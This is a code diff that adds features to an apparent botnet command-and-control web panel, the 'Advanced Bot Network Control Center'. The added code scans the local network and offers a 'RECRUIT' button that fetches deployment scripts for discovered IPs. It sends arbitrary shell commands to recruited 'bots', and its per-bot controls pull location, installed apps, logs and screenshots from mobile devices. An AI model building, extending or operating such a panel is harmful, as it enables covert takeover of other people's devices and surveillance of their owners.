+                        <div class="feature-panel">
+                            <h5 style="color: #0080ff; margin-bottom: 0.5rem;">🎯 Quick Commands</h5>
+                            <div style="display: flex; flex-wrap: wrap; gap: 0.3rem;">
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('pwd')">PWD</button>
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('ls -la')">LS</button>
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('whoami')">WHOAMI</button>
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('uname -a')">SYSTEM</button>
+                            </div>
+                        </div>
+                        
+                        <div class="feature-panel">
+                            <h5 style="color: #0080ff; margin-bottom: 0.5rem;">📊 System Info</h5>
+                            <div style="display: flex; flex-wrap: wrap; gap: 0.3rem;">
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('free -h')">MEMORY</button>
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('df -h')">DISK</button>
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('top -n 1 | head -20')">PROCESSES</button>
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('netstat -tuln')">NETWORK</button>
+                            </div>
+                        </div>
+                        
+                        <div class="feature-panel">
+                            <h5 style="color: #0080ff; margin-bottom: 0.5rem;">🔧 Terminal Tools</h5>
+                            <div style="display: flex; flex-wrap: wrap; gap: 0.3rem;">
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('history | tail -10')">HISTORY</button>
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('env | head -10')">ENV</button>
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('which python3')">PYTHON</button>
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('ps aux | grep python')">PYTHON PROCS</button>
+                            </div>
+                        </div>
                     </div>
                 </div>
             </div>
@@ -2405,6 +3274,29 @@ UI_HTML = r"""<!DOCTYPE html>
             const response = await fetch(url, options);
             return await response.json();
         }
+        
+        // Tab switching function
+        window.switchTab = function(tabName) {
+            // Update tab buttons
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            event.target.classList.add('active');
+            
+            // Show/hide tab content
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.style.display = 'none';
+            });
+            const targetTab = document.getElementById(tabName + 'Tab');
+            if (targetTab) {
+                targetTab.style.display = 'block';
+            }
+            
+            // Initialize device terminal if switching to it
+            if (tabName === 'device-terminal' && !deviceTerminalConnected) {
+                initializeDeviceTerminal();
+            }
+        };
         
         // Terminal functions
         function appendToTerminal(message, type = 'info') {
@@ -3140,12 +4032,15 @@ Or manually execute the deployment script.
             }
         }
         
-        // Enhanced Terminal Functions
+        // Enhanced Terminal Functions - Assigned to window and global scope for onclick handlers
         function sendTerminalCommand() {
             const target = document.getElementById('targetSelect').value;
             const command = document.getElementById('commandInput').value.trim();
             
             if (!command) return;
+            
+            // Show command being executed
+            appendToTerminal(`📤 [${target}] ${command}`, 'command');
             
             // Use enhanced terminal API
             api('/api/terminal/execute', {
@@ -3154,15 +4049,101 @@ Or manually execute the deployment script.
                 body: JSON.stringify({ target, command, user_context: 'web_terminal' })
             }).then(result => {
                 if (result.status === 'success') {
-                    appendToTerminal(`📤 [${target}] ${command}`, 'command');
-                    appendToTerminal(`✅ Command executed on ${result.execution_result.results?.length || 0} devices`, 'success');
+                    const executionResult = result.execution_result;
+                    const deviceCount = executionResult.results?.length || 0;
+                    
+                    appendToTerminal(`✅ Command executed on ${deviceCount} devices`, 'success');
+                    
+                    // Display output from each device
+                    if (executionResult.results) {
+                        executionResult.results.forEach(deviceResult => {
+                            const deviceId = deviceResult.device_id || 'unknown';
+                            
+                            if (deviceResult.success) {
+                                if (deviceResult.output && deviceResult.output.trim()) {
+                                    appendToTerminal(`🖥️ Output from ${deviceId}:`, 'info');
+                                    // Display the actual command output
+                                    const outputLines = deviceResult.output.split('\n');
+                                    outputLines.forEach(line => {
+                                        if (line.trim()) {
+                                            appendToTerminal(`  ${line}`, 'output');
+                                        }
+                                    });
+                                } else {
+                                    appendToTerminal(`📝 ${deviceId}: Command completed (no output)`, 'info');
+                                }
+                                
+                                if (deviceResult.execution_time) {
+                                    appendToTerminal(`⏱️ ${deviceId}: Execution time: ${deviceResult.execution_time.toFixed(2)}s`, 'info');
+                                }
+                            } else {
+                                appendToTerminal(`❌ ${deviceId}: ${deviceResult.error || 'Command failed'}`, 'error');
+                            }
+                        });
+                    }
                 } else {
                     appendToTerminal(`❌ Terminal execution failed: ${result.error}`, 'error');
                 }
+            }).catch(error => {
+                appendToTerminal(`❌ API Error: ${error.message}`, 'error');
             });
             
             document.getElementById('commandInput').value = '';
         }
+        // Also assign to window for consistency
+        window.sendTerminalCommand = sendTerminalCommand;
+        
+        function sendQuickCommand(cmd) {
+            document.getElementById('commandInput').value = cmd;
+            sendTerminalCommand();
+        }
+        window.sendQuickCommand = sendQuickCommand;
+        
+        function handleCommandKeyPress(event) {
+            if (event.key === 'Enter') {
+                sendTerminalCommand();
+            }
+        }
+        window.handleCommandKeyPress = handleCommandKeyPress;
+        
+        function clearTerminal() {
+            document.getElementById('terminal').innerHTML = `
+                <div class="terminal-line terminal-success">
+                    <span class="terminal-timestamp">[CLEARED]</span> 
+                    🧹 Terminal cleared - Ready for new commands
+                </div>
+            `;
+            appendToActivityLog('🧹 Terminal cleared by user');
+        }
+        window.clearTerminal = clearTerminal;
+        
+        function exportTerminalLog() {
+            const terminal = document.getElementById('terminal');
+            const logs = Array.from(terminal.children).map(child => child.textContent).join('\\n');
+            const blob = new Blob([logs], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `terminal-log-${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            appendToActivityLog('📄 Terminal log exported');
+        }
+        window.exportTerminalLog = exportTerminalLog;
+        
+        // Auto-scroll functionality (using existing autoScrollEnabled variable from line 3855)
+        function toggleTerminalAutoscroll(event) {
+            autoScrollEnabled = !autoScrollEnabled;
+            const button = event.target;
+            button.textContent = autoScrollEnabled ? 'AUTO-SCROLL' : 'MANUAL-SCROLL';
+            button.style.background = autoScrollEnabled ? '' : 'rgba(255, 0, 128, 0.3)';
+            
+            appendToTerminal(`${autoScrollEnabled ? '🔄' : '⏸️'} Auto-scroll ${autoScrollEnabled ? 'enabled' : 'disabled'}`, 'info');
+        }
+        window.toggleTerminalAutoscroll = toggleTerminalAutoscroll;
         
         function getTerminalHistory() {
             api('/api/terminal/history').then(result => {
@@ -3173,32 +4154,308 @@ Or manually execute the deployment script.
                 });
             });
         }
+        window.getTerminalHistory = getTerminalHistory;
         
-        // Device Discovery Functions
-        function showDeviceDiscovery() {
-            const panel = document.getElementById('deviceDiscoveryPanel');
-            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
+        // Enhanced appendToTerminal to respect auto-scroll
+        function appendToTerminal(message, type = 'info') {
+            const terminal = document.getElementById('terminal');
+            const timestamp = new Date().toLocaleTimeString();
+            const div = document.createElement('div');
+            div.className = `terminal-line terminal-${type}`;
+            div.innerHTML = `<span class="terminal-timestamp">[${timestamp}]</span> ${message}`;
+            terminal.appendChild(div);
+            
+            if (autoScrollEnabled) {
+                terminal.scrollTop = terminal.scrollHeight;
+            }
+            
+            // Keep only last 100 entries for performance
+            while (terminal.children.length > 100) {
+                terminal.removeChild(terminal.firstChild);
+            }
         }
         
-        async function scanLocalNetwork() {
+        // Device Discovery Functions
+        window.showDeviceDiscovery = function() {
+            const panel = document.getElementById('deviceDiscoveryPanel');
+            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
+        };
+        
+        window.scanLocalNetwork = async function() {
             appendToTerminal('🔍 Starting network discovery scan...', 'info');
             
             try {
-                const result = await api('/api/discover/network', { method: 'POST' });
+                const result = await api('/api/discover/network', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({})
+                });
                 
                 if (result.status === 'success') {
-                    appendToTerminal(`📡 Network scan completed: ${result.total_discovered} devices discovered`, 'success');
-                    displayDiscoveredDevices(result.discovered_devices);
+                    appendToTerminal(`✅ Network scan completed - Found ${result.total_discovered} devices`, 'success');
+                    refreshDiscoveryResults();
                 } else {
                     appendToTerminal(`❌ Network scan failed: ${result.error}`, 'error');
                 }
             } catch (error) {
                 appendToTerminal(`❌ Network scan error: ${error.message}`, 'error');
             }
+        };
+        
+        window.refreshDiscoveryResults = async function() {
+            try {
+                const result = await api('/api/discover/results');
+                const container = document.getElementById('discoveryResults');
+                
+                if (result.discovered_devices && result.discovered_devices.length > 0) {
+                    container.innerHTML = '';
+                    result.discovered_devices.forEach(device => {
+                        const deviceDiv = document.createElement('div');
+                        deviceDiv.className = 'discovery-item';
+                        deviceDiv.innerHTML = `
+                            <div class="discovery-info">
+                                <strong>${device.ip}</strong>
+                                <div class="discovery-details">
+                                    OS: ${device.os || 'Unknown'} | 
+                                    Ports: ${device.open_ports?.join(', ') || 'None'} |
+                                    Status: ${device.status || 'Unknown'}
+                                </div>
+                            </div>
+                            <button class="btn btn-secondary" onclick="recruitDevice('${device.ip}', '${device.os}')">
+                                RECRUIT
+                            </button>
+                        `;
+                        container.appendChild(deviceDiv);
+                    });
+                } else {
+                    container.innerHTML = '<div class="discovery-item">No devices discovered yet. Click "SCAN LOCAL NETWORK" to start.</div>';
+                }
+            } catch (error) {
+                console.error('Failed to refresh discovery results:', error);
+            }
+        };
+        
+        window.recruitDevice = async function(ip, os) {
+            try {
+                const result = await api('/api/discover/recruit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ target_ip: ip, target_os: os })
+                });
+                
+                if (result.status === 'success') {
+                    appendToTerminal(`🎯 Recruitment script generated for ${ip}`, 'success');
+                    appendToTerminal('📝 Deployment Script:', 'info');
+                    appendToTerminal(result.recruitment_script, 'code');
+                } else {
+                    appendToTerminal(`❌ Recruitment failed: ${result.error}`, 'error');
+                }
+            } catch (error) {
+                appendToTerminal(`❌ Recruitment error: ${error.message}`, 'error');
+            }
+        };
+        
+        // Resource Optimization Functions
+        window.showResourceOptimization = function() {
+            const panel = document.getElementById('resourceOptimizationPanel');
+            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
+        };
+        
+        window.autoOptimizeResources = async function() {
+            appendToTerminal('⚙️ Starting automatic resource optimization...', 'info');
+            
+            try {
+                const result = await api('/api/optimization/apply', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ auto_optimize: true })
+                });
+                
+                if (result.status === 'success') {
+                    appendToTerminal('✅ Resource optimization completed', 'success');
+                    appendToTerminal(`📊 New Limits: ${result.new_limits.max_devices} devices, ${result.new_limits.max_workers} workers, ${result.new_limits.max_memory_mb}MB memory`, 'info');
+                    
+                    // Update optimization results panel
+                    const resultsDiv = document.getElementById('optimizationResults');
+                    resultsDiv.innerHTML = `
+                        <div style="color: #00ff9f;">✅ System Optimized</div>
+                        <div style="font-size: 12px; margin-top: 0.5rem;">
+                            Max Devices: ${result.new_limits.max_devices}<br>
+                            Workers: ${result.new_limits.max_workers}<br>
+                            Memory Limit: ${result.new_limits.max_memory_mb}MB
+                        </div>
+                    `;
+                } else {
+                    appendToTerminal(`❌ Optimization failed: ${result.error}`, 'error');
+                }
+            } catch (error) {
+                appendToTerminal(`❌ Optimization error: ${error.message}`, 'error');
+            }
+        };
+        
+        // Device Terminal Functions
+        let deviceTerminalConnected = false;
+        let deviceTerminalSession = null;
+        
+        window.initializeDeviceTerminal = function() {
+            deviceTerminalConnected = true;
+            document.getElementById('deviceTerminalStatus').textContent = 'Connected';
+            document.getElementById('deviceTerminalStatus').style.color = '#00ff9f';
+            document.getElementById('deviceTerminalInput').disabled = false;
+            document.getElementById('deviceTerminalExecuteBtn').disabled = false;
+            
+            appendToDeviceTerminal('🚀 Device terminal connection established', 'success');
+            appendToDeviceTerminal('Ready for command input. Type commands and press Enter.', 'info');
+            appendToDeviceTerminal('', 'info'); // Add spacing
+            
+            // Focus on input
+            document.getElementById('deviceTerminalInput').focus();
         }
         
-        function displayDiscoveredDevices(devices) {
-            const container = document.getElementById('discoveredDevices');
+        function clearDeviceTerminal() {
+            document.getElementById('deviceTerminalOutput').innerHTML = `
+                <div style="color: #00ff9f;">
+                    Device Terminal - Session Cleared<br>
+                    ===================================<br><br>
+                    Terminal ready for new commands.<br><br>
+                </div>
+            `;
+        }
+        
+        function exportDeviceTerminal() {
+            const output = document.getElementById('deviceTerminalOutput');
+            const logs = output.textContent;
+            const blob = new Blob([logs], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `device-terminal-log-${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            appendToDeviceTerminal('📄 Terminal log exported', 'info');
+        }
+        
+        function handleDeviceTerminalKeyPress(event) {
+            if (event.key === 'Enter') {
+                executeDeviceTerminalCommand();
+            }
+        }
+        
+        function executeDeviceTerminalCommand() {
+            const input = document.getElementById('deviceTerminalInput');
+            const command = input.value.trim();
+            
+            if (!command) return;
+            
+            sendDeviceTerminalCommand(command);
+            input.value = '';
+        }
+        
+        function sendDeviceTerminalCommand(command) {
+            if (!deviceTerminalConnected) {
+                appendToDeviceTerminal('❌ Terminal not connected. Click "CONNECT TO DEVICE" first.', 'error');
+                return;
+            }
+            
+            // Display command being executed
+            appendToDeviceTerminal(`$ ${command}`, 'command');
+            
+            // Execute via API with device terminal context
+            api('/api/terminal/execute', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    target: 'all', 
+                    command: command, 
+                    user_context: 'device_terminal',
+                    direct_mode: true 
+                })
+            }).then(result => {
+                if (result.status === 'success') {
+                    const executionResult = result.execution_result;
+                    
+                    if (executionResult.results && executionResult.results.length > 0) {
+                        const deviceResult = executionResult.results[0];
+                        
+                        if (deviceResult.success) {
+                            if (deviceResult.output && deviceResult.output.trim()) {
+                                // Display command output line by line
+                                const outputLines = deviceResult.output.split('\\n');
+                                outputLines.forEach(line => {
+                                    if (line.trim() || outputLines.length === 1) {
+                                        appendToDeviceTerminal(line, 'output');
+                                    }
+                                });
+                            } else {
+                                appendToDeviceTerminal('(no output)', 'info');
+                            }
+                            
+                            if (deviceResult.execution_time) {
+                                appendToDeviceTerminal(`⏱️ Completed in ${deviceResult.execution_time.toFixed(3)}s`, 'timing');
+                            }
+                        } else {
+                            appendToDeviceTerminal(`❌ Error: ${deviceResult.error || 'Command failed'}`, 'error');
+                        }
+                    } else {
+                        appendToDeviceTerminal('❌ No response from device', 'error');
+                    }
+                } else {
+                    appendToDeviceTerminal(`❌ Execution failed: ${result.error}`, 'error');
+                }
+                
+                appendToDeviceTerminal('', 'info'); // Add spacing after command
+            }).catch(error => {
+                appendToDeviceTerminal(`❌ API Error: ${error.message}`, 'error');
+                appendToDeviceTerminal('', 'info');
+            });
+        }
+        
+        function appendToDeviceTerminal(message, type = 'info') {
+            const output = document.getElementById('deviceTerminalOutput');
+            const div = document.createElement('div');
+            
+            // Color coding for different types
+            let color = '#fff';
+            switch(type) {
+                case 'success': color = '#00ff9f'; break;
+                case 'error': color = '#ff0080'; break;
+                case 'info': color = '#0080ff'; break;
+                case 'command': color = '#ffaa00'; break;
+                case 'output': color = '#ccc'; break;
+                case 'timing': color = '#888'; break;
+            }
+            
+            div.style.color = color;
+            div.style.marginBottom = '0.1rem';
+            div.textContent = message;
+            
+            output.appendChild(div);
+            output.scrollTop = output.scrollHeight;
+            
+            // Keep only last 200 lines for performance
+            while (output.children.length > 200) {
+                output.removeChild(output.firstChild);
+            }
+        }
+        
+        // Add device terminal functions to global scope
+        window.initializeDeviceTerminal = initializeDeviceTerminal;
+        window.clearDeviceTerminal = clearDeviceTerminal;
+        window.exportDeviceTerminal = exportDeviceTerminal;
+        window.handleDeviceTerminalKeyPress = handleDeviceTerminalKeyPress;
+        window.executeDeviceTerminalCommand = executeDeviceTerminalCommand;
+        window.sendDeviceTerminalCommand = sendDeviceTerminalCommand;
+        
+        // Add missing switchTab function to global scope
+        window.switchTab = switchTab;
+        
+        // Update sendCommand to use enhanced terminal
+        function sendCommand() {
+            sendTerminalCommand();
+        }
             container.innerHTML = '';
             
             if (!devices || devices.length === 0) {
@@ -3229,92 +4486,6 @@ Or manually execute the deployment script.
             });
         }
         
-        async function recruitDevice(ip, os) {
-            try {
-                const result = await api('/api/discover/recruit', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ target_ip: ip, target_os: os })
-                });
-                
-                if (result.status === 'success') {
-                    appendToTerminal(`🎯 Recruitment script generated for ${ip}`, 'success');
-                    appendToTerminal('📝 Deployment Script:', 'info');
-                    appendToTerminal(result.recruitment_script, 'code');
-                } else {
-                    appendToTerminal(`❌ Recruitment failed: ${result.error}`, 'error');
-                }
-            } catch (error) {
-                appendToTerminal(`❌ Recruitment error: ${error.message}`, 'error');
-            }
-        }
-        
-        // Resource Optimization Functions
-        function showResourceOptimization() {
-            const panel = document.getElementById('resourceOptimizationPanel');
-            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
-        }
-        
-        async function autoOptimizeResources() {
-            appendToTerminal('⚙️ Starting automatic resource optimization...', 'info');
-            
-            try {
-                const result = await api('/api/optimization/apply', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ auto_optimize: true })
-                });
-                
-                if (result.status === 'success') {
-                    appendToTerminal('✅ Resource optimization completed', 'success');
-                    appendToTerminal(`📊 New Limits: ${result.new_limits.max_devices} devices, ${result.new_limits.max_workers} workers, ${result.new_limits.max_memory_mb}MB memory`, 'info');
-                    
-                    // Update optimization results panel
-                    const resultsDiv = document.getElementById('optimizationResults');
-                    resultsDiv.innerHTML = `
-                        <div style="color: #00ff9f;">✅ System Optimized</div>
-                        <div style="font-size: 12px; margin-top: 0.5rem;">
-                            Max Devices: ${result.new_limits.max_devices}<br>
-                            Max Workers: ${result.new_limits.max_workers}<br>
-                            Max Memory: ${result.new_limits.max_memory_mb}MB
-                        </div>
-                    `;
-                } else {
-                    appendToTerminal(`❌ Optimization failed: ${result.error}`, 'error');
-                }
-            } catch (error) {
-                appendToTerminal(`❌ Optimization error: ${error.message}`, 'error');
-            }
-        }
-        
-        async function getOptimizationProfile() {
-            try {
-                const result = await api('/api/optimization/profile');
-                
-                if (result.status === 'success') {
-                    const profile = result.optimization_profile;
-                    appendToTerminal('📊 System Optimization Profile:', 'info');
-                    appendToTerminal(`💾 RAM: ${profile.ram?.total_gb?.toFixed(1)}GB total, ${profile.ram?.available_gb?.toFixed(1)}GB available`, 'info');
-                    appendToTerminal(`🔧 CPU: ${profile.cpu?.cores} cores, ${profile.cpu?.current_usage}% usage`, 'info');
-                    appendToTerminal(`💿 Disk: ${profile.disk?.free_gb?.toFixed(1)}GB free`, 'info');
-                    
-                    if (profile.battery?.present) {
-                        appendToTerminal(`🔋 Battery: ${profile.battery.percent}% ${profile.battery.power_plugged ? '(charging)' : '(on battery)'}`, 'info');
-                    }
-                    
-                    if (profile.recommendations?.length > 0) {
-                        appendToTerminal('💡 Recommendations:', 'info');
-                        profile.recommendations.forEach(rec => {
-                            appendToTerminal(`  • ${rec}`, 'warning');
-                        });
-                    }
-                } else {
-                    appendToTerminal(`❌ Profile retrieval failed: ${result.error}`, 'error');
-                }
-            } catch (error) {
-                appendToTerminal(`❌ Profile error: ${error.message}`, 'error');
-            }
-        }
         
         // Update sendCommand to use enhanced terminal
         function sendCommand() {
@@ -3334,7 +4505,389 @@ Or manually execute the deployment script.
         appendToActivityLog('🚀 Advanced Bot Network Control Center initialized');
         appendToActivityLog('📡 50,000+ device support enabled');
         appendToActivityLog('🤖 Real terminal mode with device discovery active');
+        
+        // Global variable for current bot control
+        let currentControlledBot = null;
+        
+        // Bot Control Panel Functions
+        window.openBotControlPanel = function(botId, botInfo) {
+            currentControlledBot = botId;
+            document.getElementById('botControlPanel').style.display = 'flex';
+            document.getElementById('botControlTitle').textContent = `Bot: ${botId}`;
+            
+            // Populate bot information
+            const detailsDiv = document.getElementById('botInfoDetails');
+            detailsDiv.innerHTML = `
+                <div style="font-size: 12px; color: #ccc;">
+                    <p><strong>🆔 ID:</strong> ${botId}</p>
+                    <p><strong>📍 Status:</strong> <span style="color: #00ff9f;">Online</span></p>
+                    <p><strong>🏷️ Tags:</strong> ${botInfo?.tags?.join(', ') || 'Unknown'}</p>
+                    <p><strong>⏰ Last Seen:</strong> ${new Date().toLocaleString()}</p>
+                    <p><strong>🖥️ Platform:</strong> ${botInfo?.platform || 'Unknown'}</p>
+                    <p><strong>📡 IP:</strong> ${botInfo?.ip || 'Unknown'}</p>
+                </div>
+            `;
+            
+            // Show mobile controls if it's a mobile device
+            const mobileControls = document.getElementById('mobileControls');
+            if (botInfo?.tags?.includes('mobile') || botInfo?.tags?.includes('android')) {
+                mobileControls.style.display = 'block';
+            } else {
+                mobileControls.style.display = 'none';
+            }
+            
+            // Clear previous terminal content
+            clearBotTerminal();
+            appendToBotTerminal(`🤖 Connected to bot: ${botId}`, 'success');
+        };
+        
+        window.closeBotControlPanel = function() {
+            document.getElementById('botControlPanel').style.display = 'none';
+            currentControlledBot = null;
+        };
+        
+        function sendBotCommand(commandType) {
+            if (!currentControlledBot) return;
+            
+            const commands = {
+                'status': 'echo "Bot Status: Online" && uptime',
+                'info': 'uname -a && whoami',
+                'processes': 'ps aux | head -10',
+                'network': 'ip addr show | head -20',
+                'performance': 'free -h && df -h',
+                'logs': 'tail -20 /var/log/syslog 2>/dev/null || tail -20 /var/log/messages 2>/dev/null || echo "No logs available"',
+                'battery': 'termux-battery-status 2>/dev/null || acpi -b 2>/dev/null || echo "Battery info not available"',
+                'location': 'termux-location 2>/dev/null || echo "Location not available"',
+                'apps': 'pm list packages 2>/dev/null | head -10 || echo "App list not available"'
+            };
+            
+            const command = commands[commandType];
+            if (command) {
+                appendToBotTerminal(`📤 Executing ${commandType}...`, 'info');
+                sendBotTerminalCommandDirect(command);
+            }
+        }
+        
+        function sendBotTerminalCommand() {
+            const command = document.getElementById('botCommandInput').value.trim();
+            if (!command || !currentControlledBot) return;
+            
+            sendBotTerminalCommandDirect(command);
+            document.getElementById('botCommandInput').value = '';
+        }
+        
+        function sendBotTerminalCommandDirect(command) {
+            if (!currentControlledBot) return;
+            
+            appendToBotTerminal(`📤 [${currentControlledBot}] ${command}`, 'command');
+            
+            // Execute command on specific bot
+            api('/api/terminal/execute', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    target: `id:${currentControlledBot}`, 
+                    command: command, 
+                    user_context: 'bot_control_panel' 
+                })
+            }).then(result => {
+                if (result.status === 'success') {
+                    const executionResult = result.execution_result;
+                    if (executionResult.results && executionResult.results.length > 0) {
+                        const botResult = executionResult.results[0];
+                        if (botResult.success && botResult.output) {
+                            appendToBotTerminal(`💬 Output:`, 'info');
+                            const outputLines = botResult.output.split('\\n');
+                            outputLines.forEach(line => {
+                                if (line.trim()) {
+                                    appendToBotTerminal(`  ${line}`, 'output');
+                                }
+                            });
+                        } else {
+                            appendToBotTerminal(`❌ ${botResult.error || 'Command failed'}`, 'error');
+                        }
+                    } else {
+                        appendToBotTerminal(`❌ No response from bot`, 'error');
+                    }
+                } else {
+                    appendToBotTerminal(`❌ Execution failed: ${result.error}`, 'error');
+                }
+            }).catch(error => {
+                appendToBotTerminal(`❌ API Error: ${error.message}`, 'error');
+            });
+        }
+        
+        function handleBotCommandKeyPress(event) {
+            if (event.key === 'Enter') {
+                sendBotTerminalCommand();
+            }
+        }
+        
+        function appendToBotTerminal(message, type = 'info') {
+            const terminal = document.getElementById('botTerminal');
+            const timestamp = new Date().toLocaleTimeString();
+            const div = document.createElement('div');
+            div.className = `terminal-line terminal-${type}`;
+            div.innerHTML = `<span class="terminal-timestamp">[${timestamp}]</span> ${message}`;
+            terminal.appendChild(div);
+            terminal.scrollTop = terminal.scrollHeight;
+            
+            // Keep only last 100 entries
+            while (terminal.children.length > 100) {
+                terminal.removeChild(terminal.firstChild);
+            }
+        }
+        
+        function clearBotTerminal() {
+            document.getElementById('botTerminal').innerHTML = `
+                <div class="terminal-line terminal-info">
+                    <span class="terminal-timestamp">[BOT]</span> 
+                    🤖 Bot terminal ready - Direct communication established
+                </div>
+            `;
+        }
+        
+        function exportBotLogs() {
+            const terminal = document.getElementById('botTerminal');
+            const logs = Array.from(terminal.children).map(child => child.textContent).join('\\n');
+            const blob = new Blob([logs], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `bot-${currentControlledBot}-logs-${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+        
+        function startScreenMirror() {
+            const mirrorArea = document.getElementById('screenMirrorArea');
+            mirrorArea.style.display = 'block';
+            appendToBotTerminal('📱 Starting screen mirror...', 'info');
+            
+            // Simulate screen mirroring (placeholder for actual implementation)
+            const canvas = document.getElementById('screenMirrorCanvas');
+            canvas.innerHTML = `
+                <div style="text-align: center; color: #00ff9f;">
+                    📱 Screen Mirror Active<br>
+                    <small>Bot: ${currentControlledBot}</small><br>
+                    <div style="margin-top: 1rem; font-size: 12px; color: #666;">
+                        Note: Actual screen mirroring requires<br>
+                        device-specific implementation (ADB for Android)
+                    </div>
+                </div>
+            `;
+        }
+        
+        function takeScreenshot() {
+            if (!currentControlledBot) return;
+            appendToBotTerminal('📸 Taking screenshot...', 'info');
+            sendBotTerminalCommandDirect('screencap /sdcard/screenshot.png 2>/dev/null && echo "Screenshot saved" || echo "Screenshot failed"');
+        }
+        
+        function refreshScreen() {
+            appendToBotTerminal('🔄 Refreshing screen...', 'info');
+        }
+        
+        function toggleScreenControl() {
+            appendToBotTerminal('🎮 Screen control mode toggled', 'info');
+        }
+        
+        function restartBot() {
+            if (!currentControlledBot) return;
+            if (confirm(`Are you sure you want to restart bot ${currentControlledBot}?`)) {
+                appendToBotTerminal('🔄 Restarting bot...', 'warning');
+                sendBotTerminalCommandDirect('echo "Restart command sent" && sleep 2 && echo "Bot would restart here"');
+            }
+        }
+        
+        function disconnectBot() {
+            if (!currentControlledBot) return;
+            if (confirm(`Are you sure you want to disconnect bot ${currentControlledBot}?`)) {
+                appendToBotTerminal('🔌 Disconnecting bot...', 'warning');
+                closeBotControlPanel();
+            }
+        }
+        
+        // Modify device refresh to add click handlers for individual bot control
+        if (typeof originalRefreshDevices === 'undefined') {
+            var originalRefreshDevices = refreshDevices;
+        }
+        refreshDevices = async function() {
+            await originalRefreshDevices();
+            
+            // Add click handlers to device items for individual control
+            document.querySelectorAll('.device-item').forEach(deviceItem => {
+                deviceItem.style.cursor = 'pointer';
+                deviceItem.title = 'Click to open bot control panel';
+                deviceItem.addEventListener('click', function() {
+                    const deviceId = this.dataset.deviceId || 'unknown';
+                    const botInfo = {
+                        tags: ['mobile', 'recruited'], // This would be populated from actual device data
+                        platform: 'Android',
+                        ip: '192.168.1.100'
+                    };
+                    openBotControlPanel(deviceId, botInfo);
+                });
+            });
+        };
     </script>
+    
+    <!-- Individual Bot Control Panel -->
+    <div id="botControlPanel" class="modal" style="display: none;">
+        <div class="modal-content" style="max-width: 1200px; height: 80vh;">
+            <div class="modal-header">
+                <h3>🤖 Bot Control Center</h3>
+                <span class="close" onclick="closeBotControlPanel()">&times;</span>
+            </div>
+            <div class="modal-body" style="height: calc(100% - 80px); overflow: hidden;">
+                <div id="botControlContent" style="height: 100%; display: grid; grid-template-columns: 1fr 2fr; gap: 1rem;">
+                    <!-- Bot Information Panel -->
+                    <div class="panel" style="padding: 1rem;">
+                        <h4 id="botControlTitle">Bot Information</h4>
+                        <div id="botInfoDetails"></div>
+                        
+                        <div class="bot-control-section" style="margin-top: 1rem;">
+                            <h5>🎛️ Direct Controls</h5>
+                            <div class="bot-controls" style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.5rem;">
+                                <button class="btn btn-secondary" onclick="sendBotCommand('status')">Status</button>
+                                <button class="btn btn-secondary" onclick="sendBotCommand('info')">System Info</button>
+                                <button class="btn btn-secondary" onclick="sendBotCommand('processes')">Processes</button>
+                                <button class="btn btn-secondary" onclick="sendBotCommand('network')">Network</button>
+                                <button class="btn btn-secondary" onclick="sendBotCommand('performance')">Performance</button>
+                                <button class="btn btn-secondary" onclick="sendBotCommand('logs')">Recent Logs</button>
+                            </div>
+                        </div>
+                        
+                        <div class="bot-control-section" style="margin-top: 1rem;">
+                            <h5>📱 Mobile Controls</h5>
+                            <div id="mobileControls" style="display: none;">
